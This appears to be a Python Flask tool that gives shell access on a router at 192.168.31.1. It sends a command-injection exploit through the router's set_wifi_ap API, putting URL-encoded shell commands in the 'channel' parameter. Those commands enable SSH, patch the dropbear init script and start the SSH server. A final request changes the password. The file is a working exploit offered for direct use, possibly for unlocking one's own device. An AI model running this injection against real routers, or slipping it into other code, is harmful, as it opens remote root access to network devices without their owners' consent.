from flask import Flask, render_template, request
import requests
import webbrowser
from threading import Timer

app = Flask(__name__)

def reques(stok, oldpwd, newpwd):
    urls = [
        f"http://192.168.31.1/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit",
        f"http://192.168.31.1/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bsed%20%2Di%20%22%3Ax%3AN%3As%2Fif%20%5C%5B%2E%2A%5C%3B%20then%5Cn%2E%2Areturn%200%5Cn%2E%2Afi%2F%23tb%2F%3Bb%20x%22%20%2Fetc%2Finit.d%2Fdropbear",
        f"http://192.168.31.1/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3B%2Fetc%2Finit.d%2Fdropbear%20start",
        f"http://192.168.31.1/cgi-bin/luci/;stok={stok}/api/xqsystem/set_name_password?oldPwd={oldpwd}&newPwd={newpwd}"
    ]
    results = []
    for url in urls:
        response = requests.get(url)
        results.append({
            'url': url,
            'status_code': response.status_code,
            'headers': response.headers,
            'text': response.text
        })
    return results

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        stok = request.form['stok']
        oldpwd = request.form['oldpwd']
        newpwd = request.form['newpwd']
        results = reques(stok, oldpwd, newpwd)
        return render_template('index.html', results=results)
    return render_template('index.html')

def open_browser():
    webbrowser.open_new("http://127.0.0.1:5000/")

if __name__ == '__main__':
    print("Do not close this window")
    Timer(1, open_browser).start()
    app.run(debug=False)
